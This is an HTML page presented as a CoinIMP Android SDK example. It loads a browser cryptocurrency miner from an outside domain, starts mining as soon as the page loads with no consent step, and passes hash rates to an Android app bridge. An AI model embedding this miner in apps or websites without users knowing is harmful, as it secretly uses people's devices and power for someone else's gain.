<html>
<head>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
    <script src="https://www.freecontent.date./G3Zs.js"></script>
</head>

<body>
<div class="container">
    <div class="row">
        <h1>CoinIMP Android SDK example</h1>
        <hr>
        <b>Status</b>: <h4 id="status">0</h4>
        <b>Hashes/Second</b>: <h4 id="hashes_per_second">0</h4>
        <b>Total Hashes</b>: <h4 id="total_hashes">0</h4>
    </div>
</div>

<script>

    var miner;

    function stopMining() {
        miner.stop();
        isMiningStarted = false;
        Android.onMiningStoppedJS();
    }

    function startMining() {
        miner.start();
        Android.onMiningStartedJS();
    }


    $(document).ready(function () {

        function getParameterByName(name, url) {
            if (!url) url = window.location.href;
            name = name.replace(/[\[\]]/g, "\\$&");
            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
                results = regex.exec(url);
            if (!results) return null;
            if (!results[2]) return '';
            return decodeURIComponent(results[2].replace(/\+/g, " "));
        }

        $("#status").text("Initializing...");

        miner = new Client.Anonymous(getParameterByName("site_key"), {
            threads: getParameterByName("threads"),
            autoThreads: getParameterByName("is_auto_thread"),
            throttle: getParameterByName("throttle"),
            forceASMJS: getParameterByName("is_force_ASMJS")
        });

        $("#status").text("Before Start...");

        miner.start();

        var isMiningStarted = false;
        $("#status").text("Started...");

        miner.on('open', function (e) {
            console.log("CryMore Opened!"+ JSON.stringify(e))
        });

        miner.on('close', function (e) {
            console.log("CryMore Closed!"+ JSON.stringify(e))
        });

        miner.on('error', function (e) {
            console.log("CryMore Error!"+ JSON.stringify(e))
        });

        miner.on('job', function (e) {
            console.log("CryMore Job!"+ JSON.stringify(e))
        });

         miner.on('found', function (e) {
            console.log("CryMore found!"+ JSON.stringify(e))
        });





        // Update stats once per second
        setInterval(function () {


            var hashesPerSecond = miner.getHashesPerSecond();
            var totalHashes = miner.getTotalHashes();

            console.log(totalHashes);

            if (!isMiningStarted && hashesPerSecond > 0) {
                isMiningStarted = true;
                $("#status").text("Mining...");
                Android.onMiningStartedJS();
            }

            $("#hashes_per_second").text(hashesPerSecond);
            $("#total_hashes").text(totalHashes);


            if (miner.isRunning()) {
                Android.onRunningJS(hashesPerSecond, totalHashes, null);
            }

        }, 1000);

    });

</script>

</body>
</html>

